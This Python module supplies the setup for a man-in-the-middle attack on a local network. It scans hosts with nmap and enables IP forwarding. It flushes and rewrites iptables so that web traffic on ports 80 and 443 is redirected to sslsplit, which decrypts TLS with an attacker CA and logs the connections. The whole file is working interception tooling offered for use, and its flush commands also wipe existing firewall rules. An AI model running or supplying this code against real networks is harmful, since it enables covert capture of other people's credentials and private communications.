import struct
import os
import subprocess
import socket
import re
import fcntl
from scapy.all import *
from time import *

"""
get ip address of host
link: https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib?page=1&tab=votes#tab-top
"""


def getHostIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


"""
get information of NIC using "ip addr" command
and we can get all information about ip/subnet mask and return it
Ex: ip = [10.1.10.1/24, 127.0.0.1/24]
"""


def nicInfo():
    proc = subprocess.Popen(["ip addr"], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    ipaddr = out.decode("utf-8")
    ip = re.findall("\d+\.\d+\.\d+\.\d+\/\d+", ipaddr)
    # mac = re.findall(
    #     "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", ipaddr)
    return ip


"""
by using ```ip route``` command we can get information about gateway
and also we can get which network card we using, 
it is important because we need NIC name as a parameter to get MAC address in getMac(NIC name) function
"""


def getNic():
    proc = subprocess.Popen(["ip route"], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    nic = out.decode("utf-8")
    nic = re.split(" ", nic)
    return nic[4]


"""
by "nmap" command, we can scan all device which have 
link : https://stackoverflow.com/questions/13212187/is-it-possible-to-get-the-mac-address-for-machine-using-nmap
link : https://superuser.com/questions/887887/different-behavior-sudo-nmap-vs-just-nmap
"""


def nmap(ip):
    tmp = "nmap -sn -n " + ip
    # print("Command is ", tmp)
    proc = subprocess.Popen([tmp], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    out2 = out.decode("utf-8")
    return out2


"""
https://stackoverflow.com/questions/2761829/python-get-default-gateway-for-a-local-interface-ip-address-in-linux/6556951
"""


def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))


"""
regular expression for:
ipV4 : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
MAC address : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
"""

"""
https://stackoverflow.com/questions/159137/getting-mac-address
"""


def getMac(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack(
        '256s', bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])


"""
https://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding
https://linuxconfig.org/how-to-turn-on-off-ip-forwarding-in-linux

if reveived some packet which is not belong to local machine, send out the packet.
"""


def enable_port_forwarding():
    flag = 1
    flag = str(flag)
    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables -t nat -F')
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')


def disable_port_forwarding():
    flag = 0
    flag = str(flag)
    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')


def sslsplit():
    # os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
    # tmp = "sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"
    os.system("mkdir logdir")
    os.system("mkdir /tmp/sslsplit")
    proc = subprocess.Popen(
        # ["sslsplit", "-l", "connections.log", "-j", "/tmp/sslsplit/", "-S", "logdir/", "-k", "ca.key", "-c", "ca.crt", "ssl", "0.0.0.0", "8443", "tcp", "0.0.0.0", "8080],
        ["sslsplit -d -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"],
        stdout=subprocess.PIPE,
        shell=True)


def iptables_init():
    os.system("iptables -F")
    os.system("iptables -t nat -F")


def checkNewUser(ans, preans):
    tmpans = ans.copy()
    for i in preans:
        tmpans.remove(i)
    return tmpans
